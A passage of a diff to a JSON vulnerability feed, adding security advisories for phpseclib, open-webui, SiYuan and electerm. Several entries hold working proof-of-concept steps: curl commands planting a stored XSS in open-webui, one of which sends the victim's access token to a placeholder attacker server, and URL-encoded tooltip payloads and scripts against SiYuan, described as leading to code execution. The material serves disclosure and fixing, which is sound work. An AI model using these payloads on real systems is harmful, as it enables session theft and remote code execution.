@@ -1,31 +1,572 @@
 {
-  "candidate_count": 1,
+  "candidate_count": 19,
   "candidates": [
     {
-      "canonical_id": "CVE-2026-42208",
-      "composite_confidence": 0.99,
-      "cwe": [],
-      "description": "BerriAI LiteLLM contains a SQL injection vulnerability that allows an attacker to read data from the proxy's database and potentially modify it, leading to unauthorised access to the proxy and the credentials it manages.",
-      "first_seen": "2026-05-08T18:00:29.832410+00:00",
+      "canonical_id": "CVE-2024-27355",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-400"
+      ],
+      "description": "### Impact\nAny application using that loads untrusted ASN1 files (eg. X509 certificates, RSA PKCS8 private or public keys, etc).\n\n### Patches\nhttps://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59\n\n### Workarounds\nNo.\n\n### Resources\nhttps://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59\nhttps://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf",
+      "first_seen": "2026-05-08T19:41:44.939451+00:00",
       "frameworks": [
-        "BerriAI",
-        "LiteLLM"
+        "composer"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-08T18:00:29.832410+00:00",
+      "last_seen": "2026-05-08T19:41:44.939451+00:00",
       "merged_sources": [
-        "kev"
+        "ghsa"
       ],
       "proactive_only": false,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc ; https://nvd.nist.gov/vuln/detail/CVE-2026-42208"
+        "https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b",
+        "https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27355.yaml",
+        "https://github.com/advisories/GHSA-f2qx-66wf-wvvx",
+        "https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129",
+        "https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59",
+        "https://github.com/phpseclib/phpseclib/security/advisories/GHSA-f2qx-66wf-wvvx",
+        "https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html",
+        "https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html",
+        "https://nvd.nist.gov/vuln/detail/CVE-2024-27355"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "phpseclib guardrails needed on OID length"
+    },
+    {
+      "canonical_id": "CVE-2024-7990",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "> [!IMPORTANT]\n>  Relationship to CVE-2024-7990\n\n> CVE-2024-7990 (issued by huntr.dev, March 2025) describes a stored XSS in the same field \u2014 the model description \u2014 but exploits a different bypass mechanism: a second-order injection through the sanitizeResponseContent function's video-tag placeholder restoration logic in v0.3.x. That bypass was closed in v0.4.0 by removing the video exemption from the sanitizer.\n\nThe vulnerability described in this advisory is structurally distinct: a markdown-link payload with a javascript: URI passes through sanitizeResponseContent unchanged (no angle brackets), is then parsed by marked.parse() into an `<a href=\"javascript:...\">` element, and rendered live by `{@html}`. This is a pipeline-ordering flaw where the dangerous construct is introduced after sanitization completes. Removing the video exemption has no effect on this primitive.\n\nAffected range: v0.3.5 through v0.8.12 inclusive. Fixed in: v0.9.0 (commit 5eab125, which wraps marked.parse() output in DOMPurify.sanitize).\n\nBoth vulnerabilities are independently fixable under CVE rule 4.2.11. CVE assignment for this advisory has been requested separately on that basis.\n\n### Summary\n\nThis is a stored cross-site scripting (XSS) vulnerability that allows any authenticated user with model creation permission (workspace.models) to execute arbitrary JavaScript in the browser of any other user (including admins) who views the malicious model in the chat UI.\n\n### Details\n\nRoot Cause:\nModel descriptions are rendered in two Svelte components via this chain:\n`sanitizeResponseContent(description)  \u2192  .replaceAll('\\n', '<br>')  \u2192  marked.parse()  \u2192  {@html ...}`\n\nThe model description is stored in the database without prior sanitization. Then uses this sanitization function before applying the results to the description.\n\n`index.ts:82-92`\n```ts\nexport const sanitizeResponseContent = (content: string) => {\n    return content\n        .replace(/<\\|[a-z]*$/, '')       // strip incomplete <|tokens\n        .replace(/<\\|[a-z]+\\|$/, '')     // strip incomplete <|token| \n        .replace(/<$/, '')               // strip trailing <\n        .replaceAll('<', '&lt;')         // escape < to &lt;\n        .replaceAll('>', '&gt;')         // escape > to &gt;\n        .replaceAll(/<\\|[a-z]+\\|>/g, ' ') // strip <|token|> patterns\n        .trim();\n};\n```\nThis function was designed to sanitize HTML tags, but does not take into consideration that XSS can be triggered via `javascript:` which is the fundamental issue.\n\n`.replaceAll('\\n', '<br>')` will replace newlines with `<br>` tags, and since payload can be written without newlines, its unaffected.\n\n`marked` sees `[text](url)` and generated an anchor tag and does not block the payload of `javascript:`.\n\nSvelte's `{@html}` directive inserts raw HTML into the DOM without escaping, creating the vulnerability.\n\nAffected files:\n`src/lib/components/chat/Placeholder.svelte` (lines 177\u2013181)\n`src/lib/components/chat/ChatPlaceholder.svelte` (lines 99\u2013103)\n\n\n### PoC\n\nBelow is a simple PoC that will create a model with a description to trigger an alert when pressing on the hyperlink. Replace the values inside such as HOST and TOKEN with your own values using your own test server.\n\nStep 1 - Create a model with a malicious description. The token used must be from an account with either the following.\nA. Admin privileges\nB. An account with model creation permission\n\n```bash\ncurl -X POST 'http://<HOST>/api/v1/models/create' \\\n  -H 'Authorization: Bearer <TOKEN>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"xss-test\",\n    \"name\": \"Helpful Assistant!\",\n    \"base_model_id\": \"llama3\",\n    \"meta\": {\n      \"description\": \"A helpful AI assistant. [Click here for docs](javascript:alert())\"\n    },\n    \"params\": {}\n  }'\n```\nAny authenticated user with workspace.models permission can execute this. The base_model_id should reference any model available on the instance.\n\nStep 2 - Select the model:\n\nLogin and select the created model, if you followed the PoC it will be Helpful Asisstant!\n<img width=\"1203\" height=\"718\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d649c727-276c-4011-8234-140c51a32b68\" />\n\nStep 3 - XSS Triggers:\n\nClick on the hyperlink and watch the alert trigger.\n<img width=\"1203\" height=\"718\" alt=\"image\" src=\"https://github.com/user-attachments/assets/289fc3d4-e09a-45a4-b83d-40984d47a760\" />\n\n**Below is a PoC that steals the access token from localstorage**\n\nStep 1 - Setup a local python HTTPServer\n\n`python3 -m http.sever 8080`\n\nStep 2 - Create a model with a malicious payload to steal the token from localstorage\n\n```bash\ncurl -X POST 'http://<HOST>/api/v1/models/create' \\\n  -H 'Authorization: Bearer <TOKEN>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"xss-model\",\n    \"name\": \"Token Stealer\",\n    \"base_model_id\": \"llama3\",\n    \"meta\": {\n      \"description\": \"Advanced research model. [View benchmarks](javascript:void(fetch(`http://<MALICIOUS_SERVER_IP>:8080/?t=${localStorage.token}`)))\"\n    },\n    \"params\": {}\n  }'\n```\nStep 3 - Navigate to the malicious model and click on the hyperlink\n\nCheck on the local server you have set up in Step 1 and see that the token is returned within the URL.\n<img width=\"669\" height=\"50\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7933e855-cc0a-40f5-a443-5c0363b1b8fa\" /> \n\n\n### Impact\n\nAs user's session is stored in LocalStorage, attacker can craft a malicious payload that reads the contents and sends it to their malicious server. Once an admin access token has been stolen, users can create a new tool to execute arbitrary code (feature of Open-WebUI).\n\nAttack Scenario \n```\n1. Attacker creates a model with a malicious description\n2. Victim selects model and clicks the hyperlink\n3. Victim authorization token is stolen\n```\nThis vulnerability affects all Open-WebUI users.\n\n### Remediation\n\nRecommended fix \u2014 wrap `marked.parse()` output with `DOMPurify.sanitize()`.\n\nIn the affected files, change\n\n```ts\n{@html marked.parse(\n    sanitizeResponseContent(description).replaceAll('\\n', '<br>')\n)}\n```\n\ninto\n\n```ts\n{@html DOMPurify.sanitize(\n    marked.parse(\n        sanitizeResponseContent(description).replaceAll('\\n', '<br>')\n    )\n)}\n```\nThis matches the pattern already used in other parts of the application such as but not limiting to `ConfirmDialog.svelte:130` and `NotebookView.svelte:77`. DOMPurify will handle the stripping of `javascript:` URIs, event handlers and other dangerous HTML by default.\n\n### AI Disclosure\n\nClaude was used to assist in:\n\nSystematic codebase searching to identify unsanitized `{@html}` rendering paths\nVerifying `marked@9.1.6` behavior with `javascript:` URIs\n\n## Credits\n\nLin, WeiChi from Sompo Holdings, Inc.",
+      "first_seen": "2026-05-08T19:41:44.939270+00:00",
+      "frameworks": [
+        "npm",
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939270+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-gf5m-wcrh-7928",
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-gf5m-wcrh-7928"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "open-webui Vulnerable to Stored XSS via Model Description"
+    },
+    {
+      "canonical_id": "CVE-2026-34585",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-116",
+        "CWE-1188",
+        "CWE-79"
+      ],
+      "description": "## Summary\n\nThe tooltip mouseover handler in `app/src/block/popover.ts` reads `aria-label` via `getAttribute` and passes it through `decodeURIComponent` before assigning to `messageElement.innerHTML` in `app/src/dialog/tooltip.ts:41`. The encoder used at the producer side, `escapeAriaLabel` in `app/src/util/escape.ts:19-25`, only handles HTML special characters (`\"`, `'`, `<`, literal `&lt;`) \u2014 it leaves `%XX` URL-escapes untouched. So a doc title containing `%3Cimg src=x onerror=...%3E` round-trips through `escapeAriaLabel` and the HTML attribute layer unmodified. Then `decodeURIComponent` on the consumer side converts `%3C` to a literal `<` character (a real `<`, NOT a character reference). When that string is assigned to `innerHTML`, the HTML5 tokenizer enters TagOpenState on the literal `<`, parses the `<img>` element, and the `onerror` handler fires.\n\nBecause the renderer runs with `nodeIntegration: true, contextIsolation: false, webSecurity: false` (`app/electron/main.js:407-411`), `require('child_process')` is reachable from the injected handler, escalating to arbitrary code execution.\n\nDoc titles, AV column names + descriptions, AV select options, file-tree tooltips all reach this sink because they're rendered into `class=\"ariaLabel\"` elements with `aria-label=\"${escapeAriaLabel(...)}\"`. Doc title is the easiest plant \u2014 any user with create/rename access lands the payload, and the file survives `.sy.zip` round-trip without modification.\n\n## Why a \"double HTML-decode\" framing is wrong\n\nA na\u00efve reading of the chain might suggest that `&amp;lt;` (the encoder output) decodes once at attribute-parse time to `&lt;`, then a second time at `innerHTML` time to `<` \u2014 yielding a tag. **That's incorrect** and confirmed false by direct browser testing. Per the HTML5 spec, character references in DataState produce CHARACTER tokens (text), not TagOpenState transitions: the `<` resulting from a `&lt;` reference is text data, never a tag-open delimiter. So the HTML-entity-only payload renders as visible literal text, not as a tag.\n\nThe actual bypass relies on `decodeURIComponent` producing a **literal** `<` (not a character reference) before `innerHTML` parses it. Literal `<` characters in the input stream DO trigger TagOpenState. URL encoding is the right vehicle because the encoder ignores `%XX` while the consumer chain decodes it.\n\n## Details\n\n**Encoder.** `app/src/util/escape.ts:19-25`:\n```ts\nexport const escapeAriaLabel = (html: string) => {\n    if (!html) { return html; }\n    return html.replace(/\"/g, \"&quot;\").replace(/'/g, \"&apos;\")\n        .replace(/</g, \"&amp;lt;\").replace(/&lt;/g, \"&amp;lt;\");\n};\n```\nThe four replacements only cover HTML special chars. `%XX` URL escapes are not touched.\n\n**Source \u2014 search-result rendering.** `app/src/search/util.ts:1406`:\n```ts\n<span class=\"b3-list-item__text ariaLabel\" ... aria-label=\"${escapeAriaLabel(title)}\">${escapeGreat(title)}</span>\n```\nSame pattern at `:1448`, `protyle/render/av/blockAttr.ts:205`, `protyle/render/av/col.ts:134`, `protyle/render/av/select.ts:36`, `search/unRef.ts:113`. The `title` is built from `getNotebookName(item.box) + getDisplayName(item.hPath, false)` (line 1398). The `hPath` returned by `/api/search/fullTextSearchBlock` carries the user-set doc title verbatim \u2014 `%XX` URL-escapes pass through, only HTML special chars are entity-encoded by the kernel.\n\n**Consumer.** `app/src/block/popover.ts:33,144`:\n```ts\nlet tip = aElement.getAttribute(\"aria-label\") || \"\";       // literal stored attribute value\n// ... branch logic that doesn't apply to plain search results ...\nshowTooltip(decodeURIComponent(tip), aElement, ...);       // \u2190 decodes %XX into raw chars\n```\n`decodeURIComponent` is presumably present to handle URL-encoded asset paths in some hyperlink tooltips, but it's applied unconditionally to every aria-label-sourced tip \u2014 that's what enables this bypass.\n\n**Sink.** `app/src/dialog/tooltip.ts:41`:\n```ts\nmessageElement.innerHTML = message;     // \u2190 HTML parser sees the now-decoded raw `<` and starts parsing tags\n```\n\n**Decode-chain trace** for in-memory title `%3Cimg src=x onerror=\"alert('SiYuan')\"%3E` (URL-encoded `<` `>` `'`, literal `\"`):\n\n| step | result |\n|------|--------|\n| in-memory title | `%3Cimg src=x onerror=\"alert('SiYuan')\"%3E` |\n| `escapeAriaLabel` writes (only `\"` and `'` get encoded \u2014 neither appears here as raw chars when `'` is `%27`) | `%3Cimg src=x onerror=&quot;alert(%27SiYuan%27)&quot;%3E` |\n| HTML attribute set: `aria-label=\"...\"` ; browser one-decodes named entities when storing | in-DOM value = `%3Cimg src=x onerror=\"alert(%27SiYuan%27)\"%3E` |\n| `getAttribute(\"aria-label\")` | `%3Cimg src=x onerror=\"alert(%27SiYuan%27)\"%3E` (verbatim) |\n| `decodeURIComponent(tip)` | **`<img src=x onerror=\"alert('SiYuan')\">`** (real `<` `'` `>` chars) |\n| `messageElement.innerHTML = \u2026` | HTML parser tokenizes raw `<img>`, creates element, fails to load `src=x`, fires `onerror` \u2192 JS runs |\n\n**Renderer + reachability.** Renderer posture and auto-admin gates same as the AV-name advisory (Advisory 1): `nodeIntegration:true, contextIsolation:false, webSecurity:false` at `app/electron/main.js:407-411`; empty-`AccessAuthCode` local auto-admin at `kernel/model/session.go:261-287`; `chrome-extension://` Origin allowlist at `session.go:277`.\n\n## Suggested fix\n\n1. **Primary \u2014 `app/src/dialog/tooltip.ts:41`**: replace\n   ```ts\n   messageElement.innerHTML = message;\n   ```\n   with\n   ```ts\n   messageElement.textContent = message;\n   ```\n   For tooltips that legitimately need markup (memo rendering, hyperlink preview cards), introduce an explicit `{html: true}` flag on `showTooltip(...)` and route the message through `DOMPurify.sanitize(message)` before assigning to `innerHTML`.\n\n2. **Drop `decodeURIComponent` at `popover.ts:144`** for the generic aria-label path. Apply it only on the few callers that intentionally pass URL-encoded asset paths (e.g. the local-asset hyperlink preview branch already inside the function), and apply it inside `try`/`catch` with a clear scope. Aria-label content is not URL-encoded by design; decoding it is a footgun that converts otherwise-safe attributes into pre-parsed HTML.\n\n3. **Consolidate the four escape helpers** in `app/src/util/escape.ts` (`escapeHtml`, `escapeAttr`, `escapeAriaLabel`, `escapeGreat`) into one `Lute.EscapeHTMLStr`-equivalent that escapes `&`, `<`, `>`, `\"`, `'`. Context-specific encoders without compile-time enforcement keep producing bug-class variants.\n\n4. **(Defense-in-depth)** Switch the main BrowserWindow to `contextIsolation: true` with a preload bridge \u2014 caps every future renderer XSS at \"DOM only,\" not RCE.\n\n---\n\n## Reproduction (copy-paste-ready)\n\nTested on Windows with SiYuan v3.6.5 (kernel + Electron) and Microsoft Edge as the offline parser-validation engine. Linux/macOS users substitute `py` with `python3` and use any modern Chromium-based browser (Edge/Chrome/Brave) for the standalone validation step.\n\n### Prereqs\n\n1. **Install SiYuan v3.6.5** from https://github.com/siyuan-note/siyuan/releases and launch once. **Do not set an `AccessAuthCode`** (default).\n2. Verify the kernel is up:\n   ```sh\n   curl -s http://127.0.0.1:6806/api/system/version\n   # \u2192 {\"code\":0,\"msg\":\"\",\"data\":\"3.6.5\"}\n   ```\n3. Create at least one notebook (the file tree's \"+\" button) so `lsNotebooks` returns a usable id. Pin variables:\n   ```sh\n   API=http://127.0.0.1:6806\n   NOTEBOOK_ID=$(curl -s -X POST $API/api/notebook/lsNotebooks \\\n     -H 'Content-Type: application/json' -d '{}' \\\n     | python -c 'import sys,json; print(json.load(sys.stdin)[\"data\"][\"notebooks\"][0][\"id\"])')\n   echo \"Using notebook: $NOTEBOOK_ID\"\n   ```\n\n### Step A \u2014 Browser-only validation of the chain (no SiYuan needed)\n\nThis proves the bug class on its own. Save as `decode-chain.html`, open in any Chromium-based browser:\n\n```html\n<!doctype html>\n<html><body>\n<h2 id=\"status\">Click \"Simulate\" \u2014 if status turns red, the chain works.</h2>\n<span id=\"src\" class=\"ariaLabel\"\n      aria-label=\"%3Cimg src=x onerror=&quot;document.getElementById('status').innerText='RESULT: payload fired \u2014 chain works'; document.getElementById('status').style.color='red';&quot;%3E\"\n      hidden></span>\n<button onclick=\"\n  let tip = document.getElementById('src').getAttribute('aria-label');\n  console.log('after getAttribute:', JSON.stringify(tip));\n  try { tip = decodeURIComponent(tip); } catch(e){}\n  console.log('after decodeURIComponent:', JSON.stringify(tip));\n  document.getElementById('out').innerHTML = tip;\n\">Simulate SiYuan tooltip</button>\n<div id=\"out\" style=\"border:2px solid red; padding:1em; min-height:3em; margin-top:1em;\"></div>\n</body></html>\n```\n\nClick the button. The `<h2 id=\"status\">` flips to red with \"RESULT: payload fired \u2014 chain works\", and the `<div id=\"out\">` contains a fully-rendered `<img>` element (not text). Confirms the chain decodes URL-escapes between `getAttribute` and `innerHTML`, producing real tag-open characters.\n\n### Step B \u2014 Plant the payload in SiYuan\n\n```sh\nDOC_ID=$(curl -s -X POST $API/api/filetree/createDocWithMd \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"notebook\\\":\\\"$NOTEBOOK_ID\\\",\\\"path\\\":\\\"/tooltip-xss-poc-$$\\\",\\\"markdown\\\":\\\"trigger me \u2014 open the search panel, type 'trigger', and hover this result\\\"}\" \\\n  | python -c 'import sys,json; print(json.load(sys.stdin)[\"data\"])')\necho \"DOC: $DOC_ID\"\n\ncurl -s -X POST $API/api/filetree/renameDocByID \\\n  -H 'Content-Type: application/json' \\\n  --data-binary @- <<EOF\n{\"id\":\"$DOC_ID\",\"title\":\"%3Cimg src=x onerror=\\\"alert('SiYuan tooltip-XSS PoC')\\\"%3E\"}\nEOF\n```\nVerify the in-memory title round-trips:\n```sh\ncurl -s -X POST $API/api/block/getDocInfo \\\n  -H 'Content-Type: application/json' -d \"{\\\"id\\\":\\\"$DOC_ID\\\"}\" \\\n  | python -c 'import sys,json; print(json.load(sys.stdin)[\"data\"][\"ial\"][\"title\"])'\n# Expected:\n# %3Cimg src=x onerror=\"alert('SiYuan tooltip-XSS PoC')\"%3E\n```\n\n### Step C \u2014 Trigger inside SiYuan\n\nIn the SiYuan desktop client:\n1. Open the search panel (`Ctrl+P` / `\u2318+P`).\n2. Type `trigger`.\n3. The result list renders the doc with `aria-label=\"${escapeAriaLabel(title)}\"`. The DOM attribute now contains `%3Cimg src=x onerror=\"alert('SiYuan tooltip-XSS PoC')\"%3E` (URL-escapes survived; `&quot;` came from escapeAriaLabel and was decoded by the attribute parser to `\"`).\n4. **Hover the result row.** `popover.ts:33` reads the attribute, `popover.ts:144` calls `decodeURIComponent` (decoding `%3C`/`%27`/`%3E` to literal `<`/`'`/`>`), `tooltip.ts:41` writes `innerHTML` \u2014 HTML parser creates a real `<img>` element, `onerror` fires.\n5. **`alert('SiYuan tooltip-XSS PoC')` pops.**\n\n### Step D \u2014 `.sy.zip` reproducer for upstream review\n\nFor maintainers who want a single-click reproducer:\n```sh\nZIP_PATH=$(curl -s -X POST $API/api/export/exportSY \\\n  -H 'Content-Type: application/json' -d \"{\\\"id\\\":\\\"$DOC_ID\\\"}\" \\\n  | python -c 'import sys,json; print(json.load(sys.stdin)[\"data\"][\"zip\"])')\n# The kernel re-encodes % in the URL, so it's simpler to grab from disk:\nSRC=$(ls -1t \"$HOME/SiYuanWorkspace/temp/export\"/*.sy.zip | head -1)\ncp \"$SRC\" \"$HOME/Desktop/tooltip-xss-poc.sy.zip\"\n```\nMaintainer reproduces by importing via right-click a notebook \u2192 **Import** \u2192 **SiYuan `.sy.zip`** \u2192 searching `trigger` \u2192 hovering the result. The Lute serialization stores the title in the `.sy` file with `%XX` preserved literally and `\"` HTML-entity-encoded \u2014 the IAL parser decodes the entities on load, leaving the URL escapes intact, which then feeds the `decodeURIComponent`-based bypass.\n\n### Step E \u2014 Browser-extension attack vector (the realistic remote path)\n\nA malicious or compromised installed browser extension's content/background script runs with `chrome-extension://<id>` Origin, allowlisted by `session.go:277`. The extension can run Step B's curl chain via `fetch()` without any SiYuan UI interaction beyond keeping the kernel running:\n```js\n(async () => {\n  const api = (path, body) => fetch('http://127.0.0.1:6806' + path, {\n    method: 'POST', headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify(body)\n  }).then(r => r.json());\n  const nb = await api('/api/notebook/lsNotebooks', {});\n  const id = (await api('/api/filetree/createDocWithMd', {\n    notebook: nb.data.notebooks[0].id,\n    path: '/x' + Date.now(),\n    markdown: 'trigger'\n  })).data;\n  await api('/api/filetree/renameDocByID', {\n    id,\n    title: `%3Cimg src=x onerror=\"alert('SiYuan tooltip-XSS PoC')\"%3E`\n  });\n})();\n```\nA page from `https://attacker.com` is rejected \u2014 `IsLocalOrigin` only matches localhost/loopback. Realistic remote vectors: **browser extensions**, **localhost-served webpages**, **shared `.sy.zip` imports**, **sync replication from a co-author's compromised device**.\n\n### Cleanup\n\n```sh\nDOC_ID=$(curl -s -X POST $API/api/filetree/searchDocs \\\n  -H 'Content-Type: application/json' -d '{\"k\":\"trigger me\"}' \\\n  | python -c 'import sys,json; r=json.load(sys.stdin)[\"data\"]; print(r[0][\"id\"] if r else \"\")')\n[ -n \"$DOC_ID\" ] && curl -s -X POST $API/api/filetree/removeDocByID \\\n  -H 'Content-Type: application/json' -d \"{\\\"id\\\":\\\"$DOC_ID\\\"}\"\n```\n\n## Impact\n\n- **RCE on the victim's desktop**, triggered by hovering a search result (or any other `class=\"ariaLabel\"` element rendering attacker-controlled metadata).\n- **Doc titles are the most commonly-shared field** \u2014 recipients of `.sy.zip`, Bazaar templates, and sync peers all import the malicious title automatically; the URL encoding survives every transport.\n- Same post-RCE consequences as Advisory 1: full filesystem read (incl. `~/.ssh/`, `~/.aws/credentials`, workspace `conf/conf.json`), persistence, cloud-account pivot.\n- **Multiple alternative trigger surfaces** beyond search results: AV column names + descriptions, AV select-cell options, file-tree tooltips \u2014 any element with `class=\"ariaLabel\"` and `aria-label=\"${escapeAriaLabel(...)}\"` reaches the same `popover.ts \u2192 tooltip.ts` chain.\n- **CVE-2026-34585 fix is incomplete.** The encoder-side hardening assumed exactly one HTML decode between encoder and DOM. It did not account for `decodeURIComponent` being applied to the consumer-side attribute value, which converts URL-escapes that the encoder ignored into literal `<` characters that initiate tag parsing. A consumer-side fix (`textContent`, or `DOMPurify.sanitize` on the rich-text path; and removing the unconditional `decodeURIComponent`) is required.",
+      "first_seen": "2026-05-08T19:41:44.939222+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939222+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-25rp-h46x-2hjm",
+        "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-25rp-h46x-2hjm"
       ],
       "severity": "critical",
       "source_count": 1,
-      "title": "BerriAI LiteLLM SQL Injection Vulnerability"
+      "title": "SiYuan: Electron Renderer RCE via decodeURIComponent-driven tooltip XSS in aria-label sink (incomplete fix for CVE-2026-34585)"
+    },
+    {
+      "canonical_id": "CVE-2026-43940",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22",
+        "CWE-829"
+      ],
+      "description": "### Impact\nThe `runWidget` function in `src/app/widgets/load-widget.js` constructs a file path by directly concatenating user\u2011supplied widget identifiers without any sanitisation:\n\n```javascript\nconst file = `widget-${widgetId}.js`\nconst widget = require(path.join(__dirname, file))\n```\n\nBecause `runWidget` is exposed to the renderer process via an asynchronous IPC handler with no input validation, an attacker who achieves JavaScript execution inside the renderer (for example, through a malicious plugin or a cross\u2011site scripting flaw in the built\u2011in webview) can abuse a **path traversal** (`../`) to load and execute an arbitrary JavaScript file anywhere on the victim\u2019s filesystem. This gives the attacker local code execution with the full privileges of the electerm process, leading to complete system compromise.\n\n### Patches\n\nFixed in version >= 3.7.16\n\n### Workarounds\nUntil a patch is released:\n- Do not install or run untrusted plugins.\n- Avoid loading arbitrary web content inside electerm\u2019s embedded webview (for example, disable any features that fetch and display remote HTML).\n- Run electerm in a sandboxed environment (e.g., with `bubblewrap` on Linux, AppArmor/SELinux profiles, or Windows sandboxed app execution) to limit the impact of any code execution.\n\n### Resources\n- [electerm GitHub Repository](https://github.com/electerm/electerm)\n- [electerm Security Policy](https://github.com/electerm/electerm/security)\n- Vulnerability details originally reported by external researcher (PoC confirmed on v3.7.9, Win10).",
+      "first_seen": "2026-05-08T19:41:44.939405+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939405+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-f77v-9vpc-6pjm",
+        "https://github.com/electerm/electerm/releases/tag/v3.7.16",
+        "https://github.com/electerm/electerm/security/advisories/GHSA-f77v-9vpc-6pjm",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43940"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Electerm runWidget has a path traversal that leads to arbitrary code execution"
+    },
+    {
+      "canonical_id": "CVE-2026-43941",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-601",
+        "CWE-88"
+      ],
+      "description": "### Impact\n\nElecterm's terminal hyperlink handler passes any URL clicked in the terminal directly to `shell.openExternal` without any protocol validation.\n\nWhen a user connects to a malicious SSH server, the attacker can print a crafted URI in the terminal output. If the victim clicks the link, `shell.openExternal` executes it using the operating system's default protocol handler.\n\nThis can be abused to:\n- Trigger dangerous protocol handlers (`ms-msdt:`, `search-ms:`) for code execution\n- Open local files or network shares (`file://`, UNC paths) to leak NTLM hashes or exfiltrate data\n- Launch any installed application associated with a custom URI scheme\n\nAn attacker who controls terminal output (e.g., via a malicious SSH server, compromised remote host, or malicious plugin rendering terminal content) can thus achieve arbitrary code execution or local file access on the victim's machine, requiring only that the victim clicks a displayed link.\n\n### Patches\n\nAs of electerm v3.7.9, no official patch has been released. Users should monitor the project\u2019s [GitHub releases](https://github.com/electerm/electerm/releases) and [security page](https://github.com/electerm/electerm/security) for an update addressing this issue.\n\n### Workarounds\n\nUntil a patch is available:\n- Do not click on any links displayed in terminal sessions connected to untrusted servers.\n- If possible, disable hyperlink rendering in electerm's terminal settings.\n- Use a terminal multiplexer (e.g., tmux) or a separate terminal application that filters URI schemes when working with untrusted hosts.\n- Consider running electerm in a restricted environment (sandbox, AppArmor, SELinux) that limits the spawning of protocol handlers.\n\n### Resources\n\n- [electerm GitHub Repository](https://github.com/electerm/electerm)\n- [electerm Security Policy](https://github.com/electerm/electerm/security)\n- Vulnerability details originally reported by external researcher (confirmed on v3.7.9, Win10).",
+      "first_seen": "2026-05-08T19:41:44.939385+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939385+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-fwf6-j56g-m97c",
+        "https://github.com/electerm/electerm/security/advisories/GHSA-fwf6-j56g-m97c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43941"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Electerm has an unvalidated shell.openExternal that allows arbitrary protocol execution via terminal link click"
+    },
+    {
+      "canonical_id": "CVE-2026-43942",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-200",
+        "CWE-312"
+      ],
+      "description": "### Impact\n\nThe `getConstants()` IPC handler in `src/app/lib/ipc-sync.js` serialises the entire `process.env` object and sends it to the renderer. The data is stored as `window.pre.env` and is accessible from any JavaScript running in the renderer (e.g., via the DevTools console or a compromised webview context).\n\nOn developer and CI machines, `process.env` routinely contains secrets such as:\n\n- `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN`\n- `GITHUB_TOKEN` / `NPM_TOKEN`\n- `OPENAI_API_KEY` / `DOCKER_AUTH`\n- Internal service credentials, API keys, and database URLs\n\nAn attacker who achieves any JavaScript execution within the renderer\u2014for example, through a malicious plugin, a cross-site scripting (XSS) flaw, or the terminal hyperlink execution chain\u2014can trivially exfiltrate these secrets to a remote server, leading to cloud account compromise, supply chain attacks, and lateral movement. The exposure is visible even without any code execution by simply opening the \"Info\" modal in the application, though that requires local access.\n\n### Patches\n\nA patch is yet to be available.\n\n### Workarounds\n\nUntil a patch is released:\n- Avoid launching electerm with sensitive environment variables set. Use shell scripts or a dedicated terminal profile that clears secrets before starting the application.\n- Do not install plugins from untrusted sources, and audit any installed plugins for network access.\n- Keep the renderer context as locked down as possible: disable the remote debugging port, and do not paste untrusted code into the DevTools console.\n\n### Resources\n- [electerm GitHub Repository](https://github.com/electerm/electerm)\n- [electerm Security Policy](https://github.com/electerm/electerm/security)\n- Vulnerability details originally reported by external researcher (confirmed on v3.7.9, Win10).",
+      "first_seen": "2026-05-08T19:41:44.939324+00:00",
+      "frameworks": [
+        "npm"
